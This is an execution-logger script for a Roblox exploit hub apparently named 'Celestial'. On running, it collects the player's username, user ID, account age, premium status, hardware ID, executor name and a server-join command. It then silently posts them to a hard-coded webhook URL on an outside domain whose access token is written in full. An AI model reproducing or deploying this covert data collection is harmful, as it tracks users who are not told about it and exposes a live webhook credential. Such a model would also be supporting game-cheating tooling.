local url = "https://webhook.newstargeted.com/api/webhooks/1264103527165198376/zcTnP6tevI4KTzCBFmBUYyZeTsmveU4ELQcZoYw7hl3CLOQiUEip25yf9Qw5aZAOT8lp"

local player = game:GetService("Players").LocalPlayer
local httpservice = game:GetService("HttpService")

local getgamename = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

-- Global Variables

local celestialowner = false
local robloxpremium = false
local altaccount = false

-- Celestial Owner Check

local CelestialOwnerCheck = {
    "CA226CC5-96FE-4347-8345-085323E65245" -- Corrade (mystic_4791)
}

if table.find(CelestialOwnerCheck, hwid) then
    celestialowner = true
end

-- Premium Check

if player.MembershipType == Enum.MembershipType.Premium then
    robloxpremium = true
else
    robloxpremium = false
end

-- Alt Detection

if player.AccountAge >= 30 then
    altaccount = false
else
    altaccount = true
end


-- Embed


local data = {
    ["embeds"] = {
        {
            ["title"] = "**__Celestial has been executed__**",
            ["type"] = "rich",
            ["color"] = tonumber(2752256),
            ["fields"] = {
                {
                    ["name"] = "Execution Date",
                    ["value"] = "**" .. os.date("%x") .. " | " .. os.date("%I") .. ":" .. os.date("%M") .. " " .. os.date("%p") .. "**",
                    ["inline"] = true
                },

                -- Account Info Section

                {
                    ["name"] = "",
                    ["value"] = "[**" .. player.DisplayName .. "**'s Profile](https://roblox.com/users/" .. player.UserId .. "/profile)",
                    ["inline"] = true
                },
                
                {
                    ["name"] = "=================== ACCOUNT INFO =====================",
                    ["value"] = "",
                    ["inline"] = false
                },

                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },

                {
                    ["name"] = "Username",
                    ["value"] = player.Name,
                    ["inline"] = true
                },
                
                {
                    ["name"] = "User ID",
                    ["value"] = player.UserId,
                    ["inline"] = true
                },
    
                {
                    ["name"] = "Account Age",
                    ["value"] = player.AccountAge .. " Days",
                    ["inline"] = true
                },

                {
                    ["name"] = "Celestial Owner",
                    ["value"] = celestialowner,
                    ["inline"] = true
                },

                {
                    ["name"] = "Roblox Premium",
                    ["value"] = tostring(robloxpremium) .. " | Membership Name: " .. player.MembershipType.Name,
                    ["inline"] = true
                },
                
                {
                    ["name"] = "Alt Account",
                    ["value"] = altaccount,
                    ["inline"] = true
                },

                -- Game Info Section

                {
                    ["name"] = "=================== GAME INFO =====================",
                    ["value"] = "",
                    ["inline"] = false
                },

                {
                    ["name"] = "",
                    ["value"] = "[Game Page](https://www.roblox.com/games/" .. game.PlaceId .. ")",
                    ["inline"] = true
                },

                {
                    ["name"] = "Game Name",
                    ["value"] = getgamename,
                    ["inline"] = true
                },

                {
                    ["name"] = "Place ID",
                    ["value"] = game.PlaceId,
                    ["inline"] = true
                },

                {
                    ["name"] = "Server Join Code",
                    ["value"] = "```" .. [[game:GetService("TeleportService")]] .. ":TeleportToPlaceInstance(" .. game.PlaceId..", '" .. game.JobId.."')" .. "```",
                    ["inline"] = true
                },

                -- Miscellaneous Section
                
                {
                    ["name"] = "=================== MISCELLANEOUS =====================",
                    ["value"] = "",
                    ["inline"] = false
                },

                {
                    ["name"] = "Exploit",
                    ["value"] = identifyexecutor(),
                    ["inline"] = true
                },

                {
                    ["name"] = "HWID",
                    ["value"] = "||" .. hwid .. "||",
                    ["inline"] = true
                },
               }
           }
       }
    }

    local newdata = httpservice:JSONEncode(data)

    local headers = {
        ["content-type"] = "application/json"
     }

     request = http_request
     local args = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(args)
